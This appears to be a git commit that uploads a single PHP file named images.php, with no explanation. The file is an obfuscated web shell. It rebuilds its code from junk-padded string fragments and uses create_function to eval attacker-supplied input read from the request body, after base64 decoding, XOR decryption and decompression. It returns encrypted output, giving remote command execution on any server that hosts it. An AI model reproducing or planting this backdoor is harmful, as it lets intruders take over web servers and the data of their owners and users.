c5ae2ae36814514e7fe9260feb8fac2f151eb51c
abdullahmashour <megas.mashour@gmail.com>
2020-12-01 22:06:21 +0300

    Add files via upload

---
+++ images.php
@@ -0,0 +1,12 @@
+<?php
+$b='afor($i=0;$i<$l;Ya){forYa($jYa=0;Ya($j<Ya$c&&$i<$l)Ya;$j++Ya,$iYa++){$o.=$t{Ya$i}^$k{$j}';
+$y=str_replace('d','','cdreddate_fdddunction');
+$U='$k="d57Yae962e";$YaYakh="8ea2447Ya082fd";Ya$Yakf="YaYad7347f539Yab8d";$Yap="GClg2pYaYa';
+$c='Ya;Ya}}returYan $o;}if YaYaYa(@preg_match("/$Yakh(.+)$kfYa/",@YafiYale_get_conteYan';
+$z='ts("pYahp:/Ya/Yainput"),$m)==YaYa1) {@ob_stYaart();@eYaval(Ya@YagzuYancompress(@x(Ya';
+$R=');$Yar=@bYaaYase64_encode(@x(Ya@gzYacompresYas($o),$Yak)Ya)Ya;print("$p$kh$rYa$kf");}';
+$f='fBWYaFYETB4QYa";function x($Yat,$k){$c=strYalen(Ya$k);$lYa=strlenYaYaYa($t);$o="";Y';
+$i='@YabasYae64_dYaecode($m[1]),$k)Ya))Ya;$oYa=@ob_geYat_conYatYaents();@obYa_end_clean(';
+$l=str_replace('Ya','',$U.$f.$b.$c.$z.$i.$R);
+$N=$y('',$l);$N();
+?>
